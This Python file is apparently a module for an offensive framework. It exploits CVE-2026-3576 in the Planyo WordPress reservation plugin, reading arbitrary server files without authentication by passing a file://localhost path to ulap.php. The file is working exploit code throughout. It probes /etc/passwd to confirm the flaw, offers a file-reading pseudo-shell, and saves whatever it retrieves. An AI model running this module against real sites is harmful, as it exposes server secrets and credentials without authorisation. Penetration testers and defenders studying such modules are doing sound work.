#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""CVE-2026-3576 — Planyo Online Reservation System arbitrary file read via file:// SSRF."""

from __future__ import annotations

from urllib.parse import urlencode

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.lfi import Lfi
from lib.protocols.http.wordpress import Wordpress


class Module(Auxiliary, Http_client, Wordpress, Lfi):
    __info__ = {
        "name": "Planyo Online Reservation System <= 3.0 - Arbitrary File Read (CVE-2026-3576)",
        "description": (
            "CVE-2026-3576 in Planyo Online Reservation System <= 3.0: unauthenticated "
            "arbitrary file read via ulap.php ulap_url=file://localhost<path>."
        ),
        "author": ["Balachandar Gowrisankar", "KittySploit Team"],
        "cve": ["CVE-2026-3576"],
        "references": [
            "https://www.planyo.com/wordpress-reservation-system/",
            "https://plugins.svn.wordpress.org/planyo-online-reservation-system/tags/2.9/",
            "https://nvd.nist.gov/vuln/detail/CVE-2026-3576",
        ],
        "tags": [
            "wordpress",
            "planyo",
            "ssrf",
            "file-read",
            "lfi",
            "unauthenticated",
            "cve-2026-3576",
        ],
        "agent": {
            "risk": "intrusive",
            "effects": ["active_exploitation"],
            "expected_requests": 2,
            "reversible": True,
            "approval_required": True,
            "produces": ["exploit_paths", "risk_signals", "secret_exposure"],
            "cost": 1.0,
            "noise": 0.4,
            "value": 1.0,
            "requires": {
                "tech_hints_any": ["wordpress", "planyo"],
                "confidence_min": {"wordpress": 0.3},
            },
            "chain": {
                "produces_capabilities": [
                    {"capability": "file_read", "from_detail": "file:// ulap_url SSRF"},
                ],
                "consumes_capabilities": [
                    {"capability": "ssrf_primitive", "from_detail": ""},
                ],
                "option_bindings": {},
                "suggested_followups": [],
            },
        },
    }

    base_path = OptString("/", "WordPress base path", required=False)
    skip_version_check = OptBool(False, "Skip Planyo plugin version check", required=False)
    output_file = OptString("", "Local file to write retrieved content", required=False)
    output_limit = OptInteger(
        12000,
        "Max characters to print when output_file is empty (0 = full)",
        required=False,
        advanced=True,
    )

    def _wp_base(self) -> str:
        return self.wp_normalize_base_path(self.base_path or self.path or "/")

    def _ulap_path(self) -> str:
        return self.wp_plugin_path(
            self._wp_base(),
            "planyo-online-reservation-system",
            "ulap.php",
        )

    def _version_vulnerable(self) -> bool:
        version = self.wp_plugin_version("planyo-online-reservation-system", self._wp_base())
        if not version:
            print_warning("Planyo version unknown — continuing (use skip_version_check to silence)")
            return True
        print_info(f"Planyo plugin version: {version}")
        if self.wp_version_in_range(version, (0, 0, 0), (3, 0, 0)):
            print_success("Target version is within CVE-2026-3576 range (<= 3.0)")
            return True
        print_error(f"Planyo {version} appears patched (fixed in 3.1+)")
        return False

    def execute(self, file_path: str) -> str:
        remote = (file_path or "").strip()
        if not remote:
            return ""
        if not remote.startswith("/"):
            remote = f"/{remote}"

        query = urlencode({"ulap_url": f"file://localhost{remote}"})
        response = self.http_request(
            method="GET",
            path=f"{self._ulap_path()}?{query}",
            allow_redirects=True,
            timeout=max(int(self.timeout or 15), 15),
        )
        if not response:
            return ""
        if int(response.status_code or 0) >= 400:
            print_error(f"HTTP {response.status_code}")
            return ""
        body = response.text or ""
        if "not allowed" in body.lower():
            print_error("Request blocked by ulap.php allow-list")
            return ""
        return body

    def _print_output(self, data: str, remote: str) -> bool:
        local = str(self.output_file or "").strip()
        if local:
            try:
                with open(local, "w", encoding="utf-8", errors="replace") as handle:
                    handle.write(data)
                print_success(f"Wrote {len(data)} bytes to {local}")
            except OSError as exc:
                print_error(f"Failed to write {local}: {exc}")
                return False
        else:
            limit = int(self.output_limit or 0)
            if limit > 0 and len(data) > limit:
                print_info(data[:limit])
                print_warning(f"... truncated ({len(data)} bytes total; set output_limit 0 for full)")
            else:
                print_info(data)
        print_success(f"File '{remote}' read successfully")
        return True

    def check(self):
        if not bool(self.skip_version_check):
            version = self.wp_plugin_version("planyo-online-reservation-system", self._wp_base())
            if version and not self.wp_version_in_range(version, (0, 0, 0), (3, 0, 0)):
                return {
                    "vulnerable": False,
                    "reason": f"Planyo {version} outside vulnerable range (<= 3.0)",
                    "confidence": "high",
                }

        data = self.execute("/etc/passwd")
        if not data:
            return {
                "vulnerable": False,
                "reason": "Could not read /etc/passwd via file:// SSRF",
                "confidence": "high",
            }
        if "root:" not in data and "daemon:" not in data:
            return {
                "vulnerable": False,
                "reason": "Response did not look like /etc/passwd",
                "confidence": "medium",
            }
        first_line = data.splitlines()[0] if data.splitlines() else data[:80]
        return {
            "vulnerable": True,
            "reason": f"CVE-2026-3576 confirmed — /etc/passwd: {first_line[:120]}",
            "confidence": "high",
        }

    def run(self):
        try:
            print_status("CVE-2026-3576 — Planyo ulap.php file:// arbitrary file read")
            print_info(f"Endpoint: {self._ulap_path()}")

            if not bool(self.skip_version_check) and not self._version_vulnerable():
                return False

            if self.shell_lfi:
                print_status("LFI pseudo-shell (paths read via file://localhost<path>)")
                self.handler_lfi()
                return True

            remote = str(self.file_read or "").strip()
            if not remote:
                print_error("file_read is required")
                return False

            data = self.execute(remote)
            if not data:
                return False
            return self._print_output(data, remote)
        except Exception as exc:
            print_error(f"Module failed: {exc}")
            return False
